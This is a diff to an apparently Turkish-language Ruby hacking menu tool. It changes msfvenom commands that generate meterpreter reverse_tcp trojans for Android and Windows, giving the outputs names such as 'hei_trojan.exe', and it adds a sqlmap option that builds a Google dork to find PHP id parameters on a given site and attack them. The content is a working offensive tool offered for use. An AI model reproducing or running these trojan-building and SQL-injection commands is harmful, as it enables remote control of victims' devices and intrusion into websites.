@@ -57,7 +57,7 @@ Trojan Türü
             lport = gets.chop
 
             print "Kaydedilecek dizin : ".green
-            dizin = gets.chop
+            dizin = gets.chop + "/hei_trojan.apk"
 
             system("msfvenom -p #{payload} LHOST=#{lhost} LPORT=#{lport} R > #{dizin}")
             print "Trojan dinlemeye alınsın mı (e/h) : ".yellow
@@ -82,7 +82,7 @@ Trojan Türü
             lport = gets.chop
 
             print "Kaydedilecek dizin : ".green
-            dizin = gets.chop
+            dizin = gets.chop + "/hei_trojan.exe"
 
             system("msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f exe -o #{dizin}")
             if eh == "e"
@@ -105,7 +105,7 @@ Trojan Türü
             lport = gets.chop
 
             print "Kaydedilecek dizin : ".green
-            dizin = gets.chop
+            dizin = gets.chop + "/hei_trojan.exe"
 
             system("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f exe -o #{dizin}")
             if eh == "e"
@@ -148,7 +148,8 @@ def sqlmap
 1) SQL açıklı site tarama
 2) SQL açıklı siteyi dork yardımıyla bulma (dork search)
 3) TXT dosyasındaki birden fazla siteleri tarama
-        ".yellow
+4) Hedef site SQL açık tarama        
+".yellow
 
         print "İşlem : ".green
         islemm = gets.chop
@@ -197,6 +198,12 @@ Column(s) : #{column}
             print "TXT (örnek D:\\Notlarım\\hedef.txt) : ".yellow
             hedef = gets.chop
             system("python2 sqlmap.py -m #{hedef}")
+        elsif islemm == "4"
+            system("cls")
+            print "Site (örnek : google.com) : ".yellow
+            siteadres = gets.chop
+            gercek = "inurl:#{siteadres} inurl:.php?id="
+            system("python2 sqlmap.py -g #{gercek}")
         end           
 
     elsif isletim == "2"
